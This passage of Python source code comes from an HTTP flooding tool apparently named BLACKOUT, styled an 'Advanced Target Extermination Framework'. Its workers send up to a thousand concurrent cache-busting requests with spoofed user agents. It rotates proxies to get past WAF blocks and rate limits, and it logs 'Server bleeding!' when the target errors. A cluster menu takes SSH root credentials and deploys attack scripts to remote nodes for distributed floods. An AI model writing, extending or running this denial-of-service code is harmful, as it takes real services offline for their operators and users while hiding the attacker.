                    for _ in range(add_count):
                        task = asyncio.create_task(
                            worker_func(direct_session, target_url,
                                        end_time - time.monotonic(), stats,
                                        use_proxy, SAFE_MODE, rps_limiter)
                        )
                        tasks.append(task)
                    LIVE_DASHBOARD.add_workers_spawned(add_count)
                    current_workers = new_workers
        finally:
            LIVE_DASHBOARD.enabled = False

            if dashboard_task and not dashboard_task.done():
                dashboard_task.cancel()

            for t in tasks:
                if not t.done():
                    t.cancel()

            if monitor_task and not monitor_task.done():
                monitor_task.cancel()

            try:
                await PROXY_MANAGER.stop_reviver()
            except Exception:
                pass

            if probe_session:
                try:
                    await asyncio.wait_for(probe_session.close(), timeout=2)
                except Exception:
                    pass

            if PROXY_MANAGER.sessions:
                try:
                    await asyncio.wait_for(PROXY_MANAGER.close_all(), timeout=2)
                except Exception:
                    pass

            gather_list = [t for t in tasks if not t.done()]
            if monitor_task and not monitor_task.done():
                gather_list.append(monitor_task)
            if dashboard_task and not dashboard_task.done():
                gather_list.append(dashboard_task)

            if gather_list:
                try:
                    await asyncio.wait_for(
                        asyncio.gather(*gather_list, return_exceptions=True),
                        timeout=3
                    )
                except (asyncio.TimeoutError, Exception):
                    pass

            try:
                LIVE_DASHBOARD.stop()
            except Exception:
                pass
            _restore_terminal()

    total_time = time.monotonic() - start_time
    rps_actual = stats["requests"] / total_time if total_time > 0 else 0
    stats["duration"] = total_time
    stats["rps"] = rps_actual
    stats["rps_target"] = rps
    stats["final_workers"] = current_workers
    stats["safe_mode_trigger_count"] = SAFE_MODE.trigger_count
    stats["safe_mode_paused_seconds"] = round(SAFE_MODE.total_paused_seconds, 2)
    stats["safe_mode_last_code"] = SAFE_MODE.last_trigger_code
    return stats


async def stress_worker(direct_session, target_url, duration, stats,
                        use_proxy=False, safe_state=None, rps_limiter=None):
    start_time = time.monotonic()
    while time.monotonic() - start_time < duration:
        if _INTERRUPTED[0]:
            break
        if safe_state is not None and safe_state.enabled and safe_state.active:
            await asyncio.sleep(1)
            continue

        if rps_limiter is not None:
            await rps_limiter.wait()

        separator = "&" if "?" in target_url else "?"
        url = f"{target_url}{separator}cache_bust={random_string(10)}"
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive"
        }
        session = direct_session
        proxy_key = None
        use_ssl_ctx = False

        if use_proxy and PROXY_MANAGER.enabled and PROXY_MANAGER.sessions:
            got = PROXY_MANAGER.get_session()
            if got and got[0]:
                session, proxy_key = got
                use_ssl_ctx = True
            else:
                if not PROXY_MANAGER._all_dead_notified:
                    PROXY_MANAGER._all_dead_notified = True
                    if LIVE_DASHBOARD.enabled:
                        LIVE_DASHBOARD.add_event("All Proxies Dead")
                    else:
                        print(f"  {Colors.RED}{Colors.BOLD}● PROXY MANAGER{Colors.RESET}  "
                              f"all proxies dead  {Colors.DIM}→{Colors.RESET}  "
                              f"pausing workers until revival")
                await asyncio.sleep(1.5)
                continue

        if proxy_key:
            tag = f"  {Colors.MAGENTA}[via {short_proxy(proxy_key)}]{Colors.RESET}"
        else:
            tag = f"  {Colors.DIM}[via DIRECT]{Colors.RESET}"

        req_start = time.perf_counter()
        stats["requests"] += 1
        try:
            ssl_param = PROXY_SSL_CTX if use_ssl_ctx else False
            async with session.get(url, headers=headers,
                                   timeout=aiohttp.ClientTimeout(total=8),
                                   ssl=ssl_param) as response:
                latency = int((time.perf_counter() - req_start) * 1000)
                status = response.status
                if status == 200:
                    stats["success"] += 1
                    if proxy_key: PROXY_MANAGER.record_request(proxy_key, True)
                    log_event("200", f"Target hit!  Latency: {Colors.BOLD}{latency:>4}ms{Colors.RESET}{tag}")
                elif status == 403:
                    stats["blocked"] += 1
                    if proxy_key: PROXY_MANAGER.record_request(proxy_key, False)
                    log_event("403", f"Blocked by WAF!  Latency: {latency}ms{tag}")
                elif status == 429:
                    stats["rate_limit"] += 1
                    if proxy_key: PROXY_MANAGER.record_request(proxy_key, False)
                    log_event("429", f"Rate limit triggered.  Latency: {latency}ms{tag}")
                elif status in ORIGIN_ERROR_CODES:
                    stats["server_error"] += 1
                    if proxy_key: PROXY_MANAGER.record_request(proxy_key, True)
                    log_event(str(status), f"Server bleeding!  Latency: {latency}ms{tag}")
                    if safe_state is not None and safe_state.enabled:
                        if safe_state.trigger(status):
                            if LIVE_DASHBOARD.enabled:
                                LIVE_DASHBOARD.add_event("Safe-Mode · Triggered")
                            else:
                                print(f"  {Colors.YELLOW}{Colors.BOLD}● SAFE-MODE{Colors.RESET}  "
                                      f"origin error {Colors.RED}{status}{Colors.RESET} detected  "
                                      f"{Colors.DIM}→{Colors.RESET}  pausing attack & monitoring")
                elif 500 <= status <= 599:
                    stats["server_error"] += 1
                    if proxy_key: PROXY_MANAGER.record_request(proxy_key, True)
                    log_event(str(status), f"Server error!  Latency: {latency}ms{tag}")
                else:
                    stats["other"] += 1
                    if proxy_key: PROXY_MANAGER.record_request(proxy_key, False)
                    log_event("OTHER", f"Status {status}.  Latency: {latency}ms{tag}")
        except asyncio.TimeoutError:
            stats["timeouts"] += 1
            if proxy_key: PROXY_MANAGER.record_request(proxy_key, True)
            log_event("TIMEOUT", f"Server drowning, timeout!{tag}")
        except asyncio.CancelledError:
            raise
        except Exception as e:
            stats["dropped"] += 1
            if proxy_key: PROXY_MANAGER.record_request(proxy_key, False)
            err_msg = str(e)[:80] if str(e) else type(e).__name__
            log_event("FAIL", f"{type(e).__name__}: {err_msg}{tag}")


async def run_benchmark(target_url, concurrency, duration, use_proxy,
                        safe_mode=False, rps=DEFAULT_RPS, _return_stats=False):
    stats = {"requests": 0, "success": 0, "rate_limit": 0, "blocked": 0,
             "server_error": 0, "timeouts": 0, "dropped": 0, "other": 0}
    stats = await adaptive_attack(stress_worker, target_url, concurrency,
                                  max_concurrency=1000, min_concurrency=50,
                                  duration=duration, stats=stats,
                                  use_proxy=use_proxy, safe_mode=safe_mode,
                                  rps=rps)

    print(f"\n  {Colors.BOLD}{Colors.CYAN}● ANNIHILATION REPORT{Colors.RESET}\n")
    print(f"  {Colors.DIM}├─{Colors.RESET} Battle Time       {Colors.BOLD}{stats['duration']:.2f}s{Colors.RESET}")
    print(f"  {Colors.DIM}├─{Colors.RESET} Shots Fired       {Colors.BOLD}{stats['requests']}{Colors.RESET}")
    print(f"  {Colors.DIM}├─{Colors.RESET} Fire Rate         {Colors.BOLD}{stats['rps']:.2f} req/s{Colors.RESET}  "
          f"{Colors.DIM}(per-worker RPS: {stats.get('rps_target', '?')}){Colors.RESET}")
    print(f"  {Colors.DIM}├─{Colors.RESET} Direct Hits       {Colors.GREEN}{stats['success']}{Colors.RESET}")
    print(f"  {Colors.DIM}├─{Colors.RESET} Blocks            {Colors.RED}{stats.get('blocked', 0)}{Colors.RESET}")
    print(f"  {Colors.DIM}├─{Colors.RESET} Rate Limited      {Colors.YELLOW}{stats['rate_limit']}{Colors.RESET}")
    print(f"  {Colors.DIM}├─{Colors.RESET} Server Errors     {Colors.RED}{stats['server_error']}{Colors.RESET}")
    print(f"  {Colors.DIM}├─{Colors.RESET} Timeouts          {stats['timeouts']}")
    print(f"  {Colors.DIM}├─{Colors.RESET} Conn Drops        {stats['dropped']}")
    print(f"  {Colors.DIM}├─{Colors.RESET} Other             {stats['other']}")
    print(f"  {Colors.DIM}└─{Colors.RESET} Final Workers     {Colors.BOLD}{stats.get('final_workers', '?')}{Colors.RESET}")

    if safe_mode:
        print(f"\n  {Colors.BOLD}{Colors.GREEN}● SAFE MODE SUMMARY{Colors.RESET}\n")
        print(f"  {Colors.DIM}├─{Colors.RESET} Triggers          {Colors.YELLOW}{stats.get('safe_mode_trigger_count', 0)}{Colors.RESET}")
        print(f"  {Colors.DIM}├─{Colors.RESET} Paused Total      {Colors.BOLD}{stats.get('safe_mode_paused_seconds', 0)}s{Colors.RESET}")
        print(f"  {Colors.DIM}└─{Colors.RESET} Last Error Code   {Colors.RED}{stats.get('safe_mode_last_code', 'N/A')}{Colors.RESET}")

    save_json_report("standard_stress", stats)

    if _return_stats:
        return stats


async def proxy_management_menu():
    while True:
        clear_screen()
        total = len(PROXY_MANAGER.all_proxies)
        working = len(PROXY_MANAGER.working_proxies)
        dead = len(PROXY_MANAGER.dead_proxies)
        sessions = len(PROXY_MANAGER.sessions)
        mode = PROXY_MANAGER.rotation_mode

        print(f"""{Colors.BOLD}{Colors.MAGENTA}
  ██████╗ ██████╗  ██████╗ ██╗  ██╗██╗   ██╗
  ██╔══██╗██╔══██╗██╔═══██╗╚██╗██╔╝╚██╗ ██╔╝
  ██████╔╝██████╔╝██║   ██║ ╚███╔╝  ╚████╔╝ 
  ██╔═══╝ ██╔══██╗██║   ██║ ██╔██╗   ╚██╔╝  
  ██║     ██║  ██║╚██████╔╝██╔╝ ██╗   ██║   
  ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
{Colors.RESET}{Colors.BOLD}{Colors.DIM}         ── Management & Rotation Control ──{Colors.RESET}
""")

        print(f"  {Colors.BOLD}● STATUS{Colors.RESET}")
        print(f"  {Colors.DIM}├─{Colors.RESET} Total Loaded     {Colors.BOLD}{Colors.CYAN}{total:>5}{Colors.RESET}")
        print(f"  {Colors.DIM}├─{Colors.RESET} Working          {Colors.BOLD}{Colors.GREEN}{working:>5}{Colors.RESET}  {Colors.DIM}(alive){Colors.RESET}")
        print(f"  {Colors.DIM}├─{Colors.RESET} Dead             {Colors.BOLD}{Colors.RED}{dead:>5}{Colors.RESET}  {Colors.DIM}(failed){Colors.RESET}")
        print(f"  {Colors.DIM}├─{Colors.RESET} Active Sessions  {Colors.BOLD}{Colors.MAGENTA}{sessions:>5}{Colors.RESET}")
        print(f"  {Colors.DIM}└─{Colors.RESET} Rotation Mode    {Colors.BOLD}{Colors.YELLOW}{mode}{Colors.RESET}")
        print()

        print(f"  {Colors.BOLD}● OPERATIONS{Colors.RESET}")
        print(f"  {Colors.CYAN}  [1]{Colors.RESET}  Load proxies from file          {Colors.DIM}→ bulk import{Colors.RESET}")
        print(f"  {Colors.CYAN}  [2]{Colors.RESET}  Add proxy manually              {Colors.DIM}→ single add{Colors.RESET}")
        print(f"  {Colors.GREEN}  [3]{Colors.RESET}  Validate all proxies            {Colors.DIM}→ health + ping{Colors.RESET}")
        print(f"  {Colors.MAGENTA}  [4]{Colors.RESET}  Show proxy statistics           {Colors.DIM}→ per-proxy metrics{Colors.RESET}")
        print(f"  {Colors.YELLOW}  [5]{Colors.RESET}  Set rotation mode               {Colors.DIM}→ random / rr / weighted{Colors.RESET}")
        print()
        print(f"  {Colors.BOLD}● CONFIGURATION{Colors.RESET}")
        print(f"  {Colors.BLUE}  [6]{Colors.RESET}  Validation URL                  {Colors.DIM}→ {PROXY_MANAGER.validation_url[:40]}{Colors.RESET}")
        print(f"  {Colors.BLUE}  [7]{Colors.RESET}  Validation timeout              {Colors.DIM}→ {PROXY_MANAGER.validation_timeout}s{Colors.RESET}")
        print(f"  {Colors.BLUE}  [8]{Colors.RESET}  Validation concurrency          {Colors.DIM}→ {PROXY_MANAGER.validation_concurrency}{Colors.RESET}")
        print()
        print(f"  {Colors.BOLD}● MAINTENANCE{Colors.RESET}")
        print(f"  {Colors.GREEN}  [9]{Colors.RESET}  Save working proxies to file    {Colors.DIM}→ working_proxies.txt{Colors.RESET}")
        print(f"  {Colors.RED}  [C]{Colors.RESET}  Clear all proxies               {Colors.DIM}→ wipe pool{Colors.RESET}")
        print(f"  {Colors.DIM}  [0]{Colors.RESET}  Back to main menu")
        print()

        if not SOCKS_AVAILABLE:
            print(f"  {Colors.RED}⚠  aiohttp-socks not installed — SOCKS proxies won't work{Colors.RESET}")
            print(f"  {Colors.DIM}   Install: pip install aiohttp-socks --break-system-packages{Colors.RESET}")
            print()

        print(f"  {Colors.DIM}{'─' * 60}{Colors.RESET}")

        choice = input(f"\n  {Colors.BOLD}➜ Select option: {Colors.RESET}").strip().lower()

        if choice == "0":
            return
        elif choice == "1":
            filepath = input(f"  {Colors.BOLD}Proxy file path [{Colors.GREEN}proxies.txt{Colors.RESET}]: ").strip() or "proxies.txt"
            count, msg = PROXY_MANAGER.load_from_file(filepath)
            print(f"\n  {Colors.GREEN}✓{Colors.RESET} {msg}")
            input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
        elif choice == "2":
            raw = input(f"  {Colors.BOLD}Proxy (e.g. socks5://user:pass@ip:port): {Colors.RESET}").strip()
            ok, msg = PROXY_MANAGER.add_proxy(raw)
            color = Colors.GREEN if ok else Colors.RED
            symbol = "✓" if ok else "!"
            print(f"\n  {color}{symbol}{Colors.RESET} {msg}")
            input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
        elif choice == "3":
            if not PROXY_MANAGER.all_proxies:
                print(f"\n  {Colors.RED}⚠ No proxies loaded.{Colors.RESET}")
                input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
                continue
            alive, dead, _ = await PROXY_MANAGER.validate_all()
            if alive > 0:
                print(f"  {Colors.CYAN}➜ Creating sessions for working proxies...{Colors.RESET}")
                created = await PROXY_MANAGER.create_sessions()
                PROXY_MANAGER.enabled = True
                print(f"  {Colors.GREEN}✓ {created} sessions ready. Proxy rotation ENABLED.{Colors.RESET}")
            input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
        elif choice == "4":
            PROXY_MANAGER.print_stats()
            input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
        elif choice == "5":
            print(f"\n  {Colors.BOLD}Available rotation modes:{Colors.RESET}\n")
            print(f"  {Colors.CYAN}  [1]{Colors.RESET}  random          {Colors.DIM}— random proxy per request{Colors.RESET}")
            print(f"  {Colors.CYAN}  [2]{Colors.RESET}  round_robin     {Colors.DIM}— sequential rotation{Colors.RESET}")
            print(f"  {Colors.CYAN}  [3]{Colors.RESET}  weighted        {Colors.DIM}— favor faster proxies{Colors.RESET}")
            print()
            mode_input = input(f"  {Colors.BOLD}➜ Select mode [{Colors.YELLOW}current: {PROXY_MANAGER.rotation_mode}{Colors.RESET}]: {Colors.RESET}").strip()

            mode_map = {"1": "random", "2": "round_robin", "3": "weighted"}

            if not mode_input:
                mode = PROXY_MANAGER.rotation_mode
            elif mode_input in mode_map:
                mode = mode_map[mode_input]
            elif mode_input in ("random", "round_robin", "weighted"):
                mode = mode_input
            else:
                mode = None

            if mode:
                PROXY_MANAGER.rotation_mode = mode
                print(f"\n  {Colors.GREEN}✓{Colors.RESET} Rotation mode set to: {Colors.BOLD}{mode}{Colors.RESET}")
            else:
                print(f"\n  {Colors.RED}⚠ Invalid mode{Colors.RESET}")
            input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
        elif choice == "6":
            url = input(f"  {Colors.BOLD}Validation URL [{Colors.DIM}{PROXY_MANAGER.validation_url}{Colors.RESET}]: ").strip()
            if url:
                PROXY_MANAGER.validation_url = url
                print(f"\n  {Colors.GREEN}✓{Colors.RESET} URL updated")
            input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
        elif choice == "7":
            t = input(f"  {Colors.BOLD}Timeout seconds [{Colors.DIM}{PROXY_MANAGER.validation_timeout}{Colors.RESET}]: ").strip()
            if t.isdigit():
                PROXY_MANAGER.validation_timeout = int(t)
                print(f"\n  {Colors.GREEN}✓{Colors.RESET} Timeout set to {Colors.BOLD}{t}s{Colors.RESET}")
            input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
        elif choice == "8":
            c = input(f"  {Colors.BOLD}Concurrency [{Colors.DIM}{PROXY_MANAGER.validation_concurrency}{Colors.RESET}]: ").strip()
            if c.isdigit():
                PROXY_MANAGER.validation_concurrency = int(c)
                print(f"\n  {Colors.GREEN}✓{Colors.RESET} Concurrency set to {Colors.BOLD}{c}{Colors.RESET}")
            input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
        elif choice == "9":
            if not PROXY_MANAGER.working_proxies:
                print(f"\n  {Colors.RED}⚠ No working proxies to save.{Colors.RESET}")
            else:
                fp = PROXY_MANAGER.save_working()
                print(f"\n  {Colors.GREEN}✓{Colors.RESET} Saved {Colors.BOLD}{len(PROXY_MANAGER.working_proxies)}{Colors.RESET} proxies to {fp}")
            input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
        elif choice == "c":
            confirm = input(f"\n  {Colors.RED}Clear ALL proxies? (y/N): {Colors.RESET}").strip().lower()
            if confirm == "y":
                msg = PROXY_MANAGER.clear_all()
                print(f"\n  {Colors.GREEN}✓{Colors.RESET} {msg}")
            input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")


async def node_management_menu():
    while True:
        clear_screen()
        total = len(NODE_MANAGER.nodes)
        ready = sum(1 for n in NODE_MANAGER.nodes if n.status == "ready")
        attacking = sum(1 for n in NODE_MANAGER.nodes if n.status == "attacking")
        errored = sum(1 for n in NODE_MANAGER.nodes if n.status == "error")

        print(f"""{Colors.BOLD}{Colors.MAGENTA}
  ███╗   ██╗ ██████╗ ██████╗ ███████╗
  ████╗  ██║██╔═══██╗██╔══██╗██╔════╝
  ██╔██╗ ██║██║   ██║██║  ██║█████╗  
  ██║╚██╗██║██║   ██║██║  ██║██╔══╝  
  ██║ ╚████║╚██████╔╝██████╔╝███████╗
  ╚═╝  ╚═══╝ ╚═════╝ ╚═════╝ ╚══════╝
{Colors.RESET}{Colors.BOLD}{Colors.DIM}      ── Distributed Attack Cluster ──{Colors.RESET}
""")

        print(f"  {Colors.BOLD}● CLUSTER STATUS{Colors.RESET}")
        print(f"  {Colors.DIM}├─{Colors.RESET} Total Nodes      {Colors.BOLD}{Colors.CYAN}{total:>5}{Colors.RESET}")
        print(f"  {Colors.DIM}├─{Colors.RESET} Ready            {Colors.BOLD}{Colors.GREEN}{ready:>5}{Colors.RESET}")
        print(f"  {Colors.DIM}├─{Colors.RESET} Attacking        {Colors.BOLD}{Colors.MAGENTA}{attacking:>5}{Colors.RESET}")
        print(f"  {Colors.DIM}└─{Colors.RESET} Errors           {Colors.BOLD}{Colors.RED}{errored:>5}{Colors.RESET}")
        print()

        if NODE_MANAGER.nodes:
            print(f"  {Colors.BOLD}● NODES{Colors.RESET}")
            header = f"  {'#':<3} {'ENDPOINT':<22} {'USER':<10} {'CPU':>6} {'RAM':>6} {'LOAD':>7}  STATUS"
            print(f"{Colors.DIM}{header}{Colors.RESET}")
            print(f"  {Colors.DIM}{'─' * 84}{Colors.RESET}")
            status_colors = {
                "pending": Colors.DIM, "connecting": Colors.CYAN,
                "connected": Colors.CYAN, "deploying": Colors.YELLOW,
                "ready": Colors.GREEN, "attacking": Colors.MAGENTA,
                "error": Colors.RED,
            }
            for i, n in enumerate(NODE_MANAGER.nodes, 1):
                sc = status_colors.get(n.status, Colors.DIM)
                cpu_str = f"{n.cpu:>5.1f}%" if n.last_update else "  --  "
                ram_str = f"{n.ram:>5.1f}%" if n.last_update else "  --  "
                load_str = f"{n.load:>7}" if n.last_update else "    -- "
                print(f"  {i:<3} {n.label():<22} {n.username:<10} "
                      f"{cpu_str} {ram_str} {load_str}  {sc}{n.status}{Colors.RESET}")
                if n.error_msg and n.status == "error":
                    print(f"      {Colors.DIM}└─ {n.error_msg[:70]}{Colors.RESET}")
            print()
        else:
            print(f"  {Colors.YELLOW}⚠{Colors.RESET} No nodes configured. Add your first node below.\n")

        print(f"  {Colors.BOLD}● OPERATIONS{Colors.RESET}")
        print(f"  {Colors.CYAN}  [1]{Colors.RESET}  Add node (SSH)                  {Colors.DIM}→ credentials + auto-deploy{Colors.RESET}")
        print(f"  {Colors.GREEN}  [2]{Colors.RESET}  Deploy to all nodes             {Colors.DIM}→ upload node script{Colors.RESET}")
        print(f"  {Colors.MAGENTA}  [3]{Colors.RESET}  Refresh stats (CPU/RAM)         {Colors.DIM}→ live metrics{Colors.RESET}")
        print(f"  {Colors.CYAN}  [4]{Colors.RESET}  Test SSH connections            {Colors.DIM}→ ping all nodes{Colors.RESET}")
        print(f"  {Colors.YELLOW}  [5]{Colors.RESET}  Restart node                    {Colors.DIM}→ reconnect{Colors.RESET}")
        print(f"  {Colors.RED}  [6]{Colors.RESET}  Remove node                     {Colors.DIM}→ delete{Colors.RESET}")
        print()
        print(f"  {Colors.BOLD}● MAINTENANCE{Colors.RESET}")
        print(f"  {Colors.RED}  [C]{Colors.RESET}  Clear all nodes")
        print(f"  {Colors.DIM}  [0]{Colors.RESET}  Back to main menu")
        print()

        if not PARAMIKO_AVAILABLE:
            print(f"  {Colors.RED}⚠  paramiko not installed — Node feature requires paramiko{Colors.RESET}")
            print(f"  {Colors.DIM}   Install: pip install paramiko --break-system-packages{Colors.RESET}\n")

        print(f"  {Colors.DIM}{'─' * 60}{Colors.RESET}")

        choice = input(f"\n  {Colors.BOLD}➜ Select option: {Colors.RESET}").strip().lower()

        if choice == "0":
            return
        elif choice == "1":
            try:
                ip = input(f"  {Colors.BOLD}➜ Node IP address: {Colors.RESET}").strip()
                if not ip:
                    continue
                port = int(input(f"  {Colors.BOLD}➜ SSH port [{Colors.GREEN}22{Colors.RESET}]: ").strip() or "22")
                username = input(f"  {Colors.BOLD}➜ Username [{Colors.GREEN}root{Colors.RESET}]: ").strip() or "root"
                try:
                    password = getpass.getpass(f"  {Colors.BOLD}➜ Password: {Colors.RESET}")
                except Exception:
                    password = input(f"  {Colors.BOLD}➜ Password: {Colors.RESET}")
                ok, result = NODE_MANAGER.add(ip, port, username, password)
                if ok:
                    print(f"\n  {Colors.GREEN}✓{Colors.RESET} Node added: {Colors.BOLD}{result.label()}{Colors.RESET}")
                    print(f"  {Colors.CYAN}➜ Testing connection...{Colors.RESET}")
                    if await NODE_MANAGER.connect(result):
                        print(f"  {Colors.GREEN}✓{Colors.RESET} SSH connected")
                        print(f"  {Colors.CYAN}➜ Checking python3...{Colors.RESET}")
                        if await NODE_MANAGER.check_python(result):
                            print(f"  {Colors.GREEN}✓{Colors.RESET} python3 available")
                        else:
                            print(f"  {Colors.RED}✗{Colors.RESET} python3 not found")
                        print(f"  {Colors.CYAN}➜ Uploading node script...{Colors.RESET}")
                        if await NODE_MANAGER.deploy(result):
                            print(f"  {Colors.GREEN}✓{Colors.RESET} Deployed successfully — node ready")
                        else:
                            print(f"  {Colors.RED}✗{Colors.RESET} {result.error_msg}")
                    else:
                        print(f"  {Colors.RED}✗{Colors.RESET} {result.error_msg}")
                else:
                    print(f"\n  {Colors.RED}✗{Colors.RESET} {result}")
            except ValueError:
                print(f"\n  {Colors.RED}⚠{Colors.RESET} Invalid port")
            except KeyboardInterrupt:
                print()
            input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
        elif choice == "2":
            if not NODE_MANAGER.nodes:
                print(f"\n  {Colors.RED}⚠{Colors.RESET} No nodes to deploy")
                input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
                continue
            print(f"\n  {Colors.CYAN}➜ Deploying to {len(NODE_MANAGER.nodes)} node(s)...{Colors.RESET}\n")
            for n in NODE_MANAGER.nodes:
                print(f"  {Colors.BOLD}▸ {n.label()}{Colors.RESET}")
                if not n.client:
                    print(f"    {Colors.CYAN}➜ Connecting...{Colors.RESET}")
                    if not await NODE_MANAGER.connect(n):
                        print(f"    {Colors.RED}✗ {n.error_msg}{Colors.RESET}")
                        continue
                    print(f"    {Colors.GREEN}✓ Connected{Colors.RESET}")
                print(f"    {Colors.CYAN}➜ Deploying...{Colors.RESET}")
                if await NODE_MANAGER.deploy(n):
                    print(f"    {Colors.GREEN}✓ Ready{Colors.RESET}")
                else:
                    print(f"    {Colors.RED}✗ {n.error_msg}{Colors.RESET}")
            input(f"\n  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
        elif choice == "3":
            if not NODE_MANAGER.nodes:
                print(f"\n  {Colors.RED}⚠{Colors.RESET} No nodes loaded")
                input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
                continue
            print(f"\n  {Colors.CYAN}➜ Refreshing stats from {len(NODE_MANAGER.nodes)} node(s)...{Colors.RESET}\n")
            await asyncio.gather(*[NODE_MANAGER.get_stats(n) for n in NODE_MANAGER.nodes],
                                 return_exceptions=True)
            print(f"  {Colors.GREEN}✓{Colors.RESET} Stats updated")
            await asyncio.sleep(1)
        elif choice == "4":
            if not NODE_MANAGER.nodes:
                print(f"\n  {Colors.RED}⚠{Colors.RESET} No nodes loaded")
                input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
                continue
            print(f"\n  {Colors.CYAN}➜ Testing {len(NODE_MANAGER.nodes)} node(s)...{Colors.RESET}\n")
            ok_count = 0
            fail_count = 0
            for n in NODE_MANAGER.nodes:
                print(f"  {Colors.BOLD}▸ {n.label()}{Colors.RESET}... ",
                      end="", flush=True)
                if n.client is not None:
                    try:
                        n.client.close()
                    except Exception:
                        pass
                    n.client = None
                try:
                    result = await NODE_MANAGER.connect(n)
                except Exception as e:
                    result = False
                    n.error_msg = f"{type(e).__name__}: {str(e)[:60]}"
                if result:
                    ok_count += 1
                    print(f"{Colors.GREEN}OK{Colors.RESET}")
                else:
                    fail_count += 1
                    err = n.error_msg or "unknown error"
                    print(f"{Colors.RED}FAIL{Colors.RESET} {Colors.DIM}({err}){Colors.RESET}")
            print()
            print(f"  {Colors.BOLD}● RESULT{Colors.RESET}")
            print(f"  {Colors.DIM}├─{Colors.RESET} OK     "
                  f"{Colors.GREEN}{ok_count}{Colors.RESET}")
            print(f"  {Colors.DIM}└─{Colors.RESET} Failed "
                  f"{Colors.RED}{fail_count}{Colors.RESET}")
            input(f"\n  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
            
        elif choice == "5":
            if not NODE_MANAGER.nodes:
                print(f"\n  {Colors.RED}⚠{Colors.RESET} No nodes loaded")
                input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
                continue
            print(f"\n  {Colors.BOLD}Select node to restart:{Colors.RESET}")
            for i, n in enumerate(NODE_MANAGER.nodes, 1):
                print(f"  {i}. {n.label()}")
            try:
                idx = int(input(f"  {Colors.BOLD}➜ Node #: {Colors.RESET}").strip()) - 1
                if 0 <= idx < len(NODE_MANAGER.nodes):
                    n = NODE_MANAGER.nodes[idx]
                    if n.client:
                        try: n.client.close()
                        except Exception: pass
                    n.client = None
                    n.status = "pending"
                    print(f"\n  {Colors.CYAN}➜ Reconnecting to {n.label()}...{Colors.RESET}")
                    if await NODE_MANAGER.connect(n):
                        print(f"  {Colors.GREEN}✓ Reconnected{Colors.RESET}")
                    else:
                        print(f"  {Colors.RED}✗ {n.error_msg}{Colors.RESET}")
            except (ValueError, IndexError):
                print(f"\n  {Colors.RED}⚠{Colors.RESET} Invalid selection")
            input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
        elif choice == "6":
            if not NODE_MANAGER.nodes:
                print(f"\n  {Colors.RED}⚠{Colors.RESET} No nodes loaded")
                input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
                continue
            print(f"\n  {Colors.BOLD}Select node to remove:{Colors.RESET}")
            for i, n in enumerate(NODE_MANAGER.nodes, 1):
                print(f"  {i}. {n.label()}")
            try:
                idx = int(input(f"  {Colors.BOLD}➜ Node #: {Colors.RESET}").strip()) - 1
                if 0 <= idx < len(NODE_MANAGER.nodes):
                    n = NODE_MANAGER.nodes[idx]
                    label = n.label()
                    NODE_MANAGER.remove(n)
                    print(f"\n  {Colors.GREEN}✓{Colors.RESET} Removed {label}")
            except (ValueError, IndexError):
                print(f"\n  {Colors.RED}⚠{Colors.RESET} Invalid selection")
            input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
        elif choice == "c":
            if not NODE_MANAGER.nodes:
                continue
            confirm = input(f"\n  {Colors.RED}Remove ALL nodes? (y/N): {Colors.RESET}").strip().lower()
            if confirm == "y":
                for n in list(NODE_MANAGER.nodes):
                    NODE_MANAGER.remove(n)
                print(f"\n  {Colors.GREEN}✓{Colors.RESET} All nodes removed")
            input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")


async def auto_deploy_saved_nodes():
    if not NODE_MANAGER.nodes:
        return

    clear_screen()
    print(f"""
{Colors.RED}{Colors.BOLD}
  ██████╗ ██╗      █████╗  ██████╗██╗  ██╗ ██████╗ ██╗   ██╗████████╗
  ██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝██╔═══██╗██║   ██║╚══██╔══╝
  ██████╔╝██║     ███████║██║     █████╔╝ ██║   ██║██║   ██║   ██║   
  ██╔══██╗██║     ██╔══██║██║     ██╔═██╗ ██║   ██║██║   ██║   ██║   
  ██████╔╝███████╗██║  ██║╚██████╗██║  ██╗╚██████╔╝╚██████╔╝   ██║   
  ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   
{Colors.RESET}{Colors.BOLD}{Colors.MAGENTA}                  [ PANEL/SUB URL ATTACK ]
{Colors.DIM}                  Advanced Target Extermination Framework{Colors.RESET}
""")

    print(f"  {Colors.BOLD}{Colors.MAGENTA}● AUTO-DEPLOY SAVED NODES{Colors.RESET}")
    print(f"  {Colors.DIM}{'─' * 76}{Colors.RESET}\n")
    print(f"  {Colors.CYAN}➜ Found {Colors.BOLD}{len(NODE_MANAGER.nodes)}{Colors.RESET}"
          f"{Colors.CYAN} saved node(s) in {Colors.BOLD}{NODES_FILE}{Colors.RESET}")
    print(f"  {Colors.CYAN}➜ Auto-deploying before showing menu...{Colors.RESET}\n")

    for n in NODE_MANAGER.nodes:
        print(f"  {Colors.BOLD}▸ {n.label()}{Colors.RESET}")

        if not n.client:
            print(f"    {Colors.CYAN}➜ Connecting...{Colors.RESET}")
            if not await NODE_MANAGER.connect(n):
